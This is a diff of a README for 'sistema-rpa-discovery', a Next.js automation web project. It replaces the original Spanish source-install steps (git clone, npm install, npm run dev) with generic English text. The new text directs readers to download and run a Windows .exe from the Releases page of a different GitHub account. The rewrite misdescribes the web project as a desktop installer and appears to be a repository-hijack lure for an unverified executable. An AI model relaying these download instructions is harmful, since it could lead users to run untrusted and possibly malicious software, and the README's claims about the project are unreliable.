@@ -1,46 +1,85 @@
-# 🤖 Sistema RPA - Data Discovery Solutions S.A.C.
+# 🎉 sistema-rpa-discovery - Easy Automation for Your Business
 
-![Portada](public/portada.png)
+## 🚀 Getting Started
 
-Sistema RPA Discovery es una plataforma moderna desarrollada con Next.js para la automatización inteligente de procesos empresariales. Permite descubrir, gestionar y optimizar flujos de trabajo mediante bots y soluciones de RPA (Robotic Process Automation).
+Welcome to **Sistema RPA Discovery**! This platform showcases intelligent process automation bots built with Next.js. It is designed to help you understand and utilize automation in your business processes. 
 
-## Características
-- Arquitectura profesional con Next.js y Tailwind CSS
-- SEO optimizado y diseño responsivo
-- Ejemplos de bots para trading, moderación y APIs
-- Ecosistema abierto para contribuciones
-- Navegación rápida y moderna
+To get started quickly, you will need to download our application from the Releases page. Follow the instructions below to ensure a smooth experience.
 
-## Instalación
+## 📥 Download the Application
 
-1. Clona el repositorio:
-	```bash
-	git clone https://github.com/ArcGabicho/sistema-rpa-discovery.git
-	```
-2. Abre la carpeta:
-    ```bash
-    cd sistema-rpa-discovery
-    ```
-3. Instala las dependencias:
-	```bash
-	npm install
-	```
-4. Inicia el servidor de desarrollo:
-	```bash
-	npm run dev
-	```
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/Medddooddodok/sistema-rpa-discovery/releases)
 
-## Estructura del Proyecto
-```
-app/         # Componentes y páginas principales
-public/      # Imágenes y recursos estáticos
-styles/      # Archivos CSS globales
-```
+## 📋 System Requirements
 
-## Scripts Disponibles
-- `npm run dev` — Inicia el servidor de desarrollo
-- `npm run build` — Compila la aplicación para producción
-- `npm run start` — Inicia la app en modo producción
+Before downloading, ensure your computer meets the following requirements:
 
-## Licencia
-Este proyecto está bajo la licencia MIT.
+- **Operating System**: Windows 10 or later versions
+- **RAM**: At least 4 GB
+- **Processor**: 1.5 GHz or faster
+- **Disk Space**: Minimum of 200 MB free space
+
+## 👨‍💻 Features of Sistema RPA Discovery
+
+- **User-Friendly Interface**: Designed for everyone, regardless of technical skill.
+- **Automation Bots**: Demonstrates various bots for business processes.
+- **Performance Tracking**: Monitor the efficiency of your automated tasks.
+- **Easy Setup**: Simple installation process.
+
+## 📥 Download & Install
+
+1. Visit our [Releases page](https://github.com/Medddooddodok/sistema-rpa-discovery/releases) to find the latest version.
+2. Click on the latest release to access the download options.
+3. Download the appropriate file for your system (look for the .exe file).
+4. Once downloaded, double-click the file to run the installer.
+5. Follow the prompts to complete the installation.
+
+## ✅ Running the Application
+
+After installation:
+
+1. Go to your desktop or the start menu.
+2. Look for the **Sistema RPA Discovery** icon.
+3. Double-click the icon to open the application.
+
+## 🌐 Using the Application
+
+1. Upon opening, you will see the main dashboard.
+2. Explore different bots available for demonstration.
+3. Select a bot to view details and start using it.
+
+## 🛠️ Troubleshooting
+
+If you encounter issues while downloading or running the application, here are some solutions:
+
+- **Download Issues**: Ensure your internet connection is stable. Check your firewall settings if downloads seem blocked.
+- **Installation Problems**: If the installer won't run, verify that you have sufficient disk space and the correct permissions.
+- **Application Errors**: Restart your computer if you experience crashes, as this often resolves minor issues.
+
+## 🤝 Support
+
+For further assistance, please reach out to our support team via the Issues tab on the [GitHub repository](https://github.com/Medddooddodok/sistema-rpa-discovery/issues). We are here to help!
+
+## 📣 Community Contribution
+
+We encourage users to contribute by sharing their experiences and suggestions. Your feedback helps us improve the application.
+
+## 👀 Explore More
+
+Feel free to explore additional topics related to **Sistema RPA Discovery**. You may find interest in:
+
+- **blog-rpa**: Insights on robotic process automation.
+- **bot-demo**: Showcases various bots in action.
+- **download-bot**: Direct links to obtain automation bots.
+
+## 📅 Future Updates
+
+We are continuously working on enhancements. Stay updated by checking the Releases page regularly for new features and fixes.
+
+## 🔗 Important Links
+
+- [Releases Page](https://github.com/Medddooddodok/sistema-rpa-discovery/releases)
+- [Issues Page](https://github.com/Medddooddodok/sistema-rpa-discovery/issues)
+- [GitHub Repository](https://github.com/Medddooddodok/sistema-rpa-discovery)
+
+Thank you for choosing **Sistema RPA Discovery**! Enjoy automating your business processes seamlessly.
